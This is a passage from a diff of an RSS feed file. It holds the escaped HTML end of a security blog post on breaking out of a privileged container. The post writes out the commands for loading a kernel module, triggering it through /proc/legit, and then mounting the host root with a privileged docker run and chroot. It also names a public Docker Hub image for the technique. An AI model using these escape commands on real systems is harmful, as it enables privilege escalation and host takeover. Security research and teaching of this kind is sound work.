-&lt;p&gt;Once you’ve got the kernel module built you insert it into the running kernel with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insmod legit2.ko&lt;/code&gt;, and then it’s triggered by echoing text to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/legit&lt;/code&gt; in the container&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;test&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/legit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Once you’ve done that your shell gets access to the host’s mount namespace, which includes the Docker socket (or ContainerD/CRI-O socket depending on your runtime), and that means you’re one &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;pointless docker command&lt;/a&gt; from full root access on the host.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;-ti&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--volume&lt;/span&gt; /:/host busybox &lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt; /host
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h2&gt;
-
-&lt;p&gt;Here’s a video showing the process of building the kernel module, inserting it into the kernel and then breaking out of the container. The image I’m using is on Docker Hub as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raesene/privescape&lt;/code&gt;&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zoNY5malgHo&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;This was just a quick blog demonstrating how an attacker with access to a privileged container can break out of it using a Kernel module and get access to the underlying host.&lt;/p&gt;
-</description>
-				<pubDate>Sun, 06 Aug 2023 10:27:00 +0100</pubDate>
-				<link>https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</guid>
 			</item>
 		
 	</channel>
